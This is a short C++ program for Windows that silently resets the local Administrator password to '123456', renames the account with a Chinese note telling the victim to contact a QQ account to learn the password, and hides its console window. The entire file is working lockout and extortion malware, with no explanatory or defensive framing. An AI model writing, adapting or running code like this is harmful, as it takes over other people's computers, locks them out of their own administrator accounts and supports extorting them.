#include<Windows.h>
using namespace std;

int main()
{
	system("net user Administrator /fullname:想知道密码联系QQ");
	system("net user Administrator 123456");
	FreeConsole();

	return 0;
}